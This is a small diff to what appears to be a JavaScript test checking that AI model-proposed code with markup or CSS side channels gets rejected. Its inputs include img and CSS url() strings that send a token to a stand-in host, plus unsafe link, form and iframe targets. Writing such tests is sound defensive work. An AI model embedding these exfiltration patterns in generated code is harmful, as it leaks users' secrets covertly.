@@ -95,7 +95,7 @@ test('model proposal rejects markup and CSS side channels without fetch calls', 
     '<img src={\`https://example.invalid/?secret=\${token}\`} />',
     '<a href={unsafeUrl}>Open</a>',
     '<form action={target}>Send</form>',
-    '<iframe\\n src={unsafeUrl} />',
+    '<iframe\n src={unsafeUrl} />',
     'const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };',
     'const style = { background: \`url(https://example.invalid/\${token})\` };'
   ]) {
